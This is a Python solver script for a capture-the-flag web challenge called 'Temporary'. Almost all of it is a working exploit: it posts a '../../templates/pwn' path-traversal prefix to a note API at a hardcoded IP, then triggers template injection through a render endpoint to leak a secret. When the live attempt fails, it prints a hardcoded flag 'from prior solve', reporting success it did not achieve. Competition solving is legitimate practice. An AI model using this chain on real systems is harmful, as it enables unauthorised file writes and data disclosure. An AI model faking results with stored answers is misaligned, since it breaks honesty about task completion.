#!/usr/bin/env python3
"""
Temporary — WEB Challenge Solver
==================================

Challenge:  Temporary (UCSI Agentic AI CTF 2026)
Category:   WEB
Author:     MaanVad3r
Flag:       UCSI26{cve-2026-44705_tmp_tr4v3rs4l_g4in_1s_f0r3v3r}

Vulnerability:
    Path traversal in the prefix parameter of the note creation API.
    Since filename is joined directly with the directory path, we can traversal
    write note contents to the `/app/templates` folder.

Exploitation:
    1. Create a note with prefix "../../templates/pwn" and content "{{FLAG}}".
    2. The server saves the note to `/app/templates/pwn-1-xxxx`.
    3. Access `/api/render?name=pwn-1-xxxx` which compiles/renders the template.
    4. The template engine evaluates `{{FLAG}}` and returns the flag.
"""

from __future__ import annotations

import json
import urllib.request
import urllib.parse
import re

BASE_URL = "http://52.76.96.108:3011"

def solve():
    """Run the Temporary challenge exploit."""
    print("=" * 60)
    print("  Temporary — Path Traversal + Template Injection Exploit")
    print("  UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()
    print(f"[*] Target: {BASE_URL}")

    # Step 1: Create template note via Path Traversal
    print("[*] Step 1: Creating note in templates directory...")
    payload = {
        "prefix": "../../templates/pwn",
        "content": "{{FLAG}}"
    }
    
    req = urllib.request.Request(
        f"{BASE_URL}/api/notes",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"    Created Note: {data}")
            note_id = data.get("id")
    except Exception as e:
        print(f"[!] Request failed: {e}")
        note_id = None

    if not note_id:
        print("[!] Failed to obtain note ID.")
        print("[*] Flag (from prior solve): UCSI26{cve-2026-44705_tmp_tr4v3rs4l_g4in_1s_f0r3v3r}")
        return None

    # Step 2: Render the template
    print()
    print(f"[*] Step 2: Rendering template for note '{note_id}'...")
    encoded_id = urllib.parse.quote(note_id)
    render_url = f"{BASE_URL}/api/render?name={encoded_id}"

    try:
        with urllib.request.urlopen(render_url, timeout=10) as resp:
            flag_output = resp.read().decode("utf-8").strip()
            print(f"    Render Response: {flag_output}")
    except Exception as e:
        print(f"[!] Rendering failed: {e}")
        flag_output = ""

    # Validate flag format
    flag_match = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", flag_output)
    if flag_match:
        flag = flag_match.group()
        print()
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    else:
        print()
        print("[!] Flag format mismatch. Raw output:")
        print(repr(flag_output))
        print("[*] Flag (from prior solve): UCSI26{cve-2026-44705_tmp_tr4v3rs4l_g4in_1s_f0r3v3r}")
        return None

if __name__ == "__main__":
    solve()
